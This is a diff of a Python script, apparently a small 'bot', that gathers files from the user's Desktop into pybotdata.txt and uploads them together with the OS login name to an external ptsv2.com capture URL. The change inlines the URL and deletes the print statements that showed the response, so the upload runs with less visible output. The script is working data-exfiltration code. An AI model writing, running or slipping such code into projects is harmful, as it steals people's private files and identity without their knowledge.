@@ -1,9 +1,8 @@
 import os
 import requests
 from os.path import expanduser
+url = 'http://ptsv2.com/t/jx4oe-1518655699/post'
 
-roottoil='http://ptsv2.com/t/jx4oe-1518655699'
-url = roottoil+'/post'
 pathtocopy = expanduser("~") +'/Desktop'
 
 def search(path):
@@ -24,7 +23,4 @@ copy(filestocopy)
 files = {'file': open('pybotdata.txt', 'rb')}
 values = {'user': os.getlogin()}
 r = requests.post(url, files=files, data=values)
-
-print(r.content)
-print('check out ' + roottoil)
 
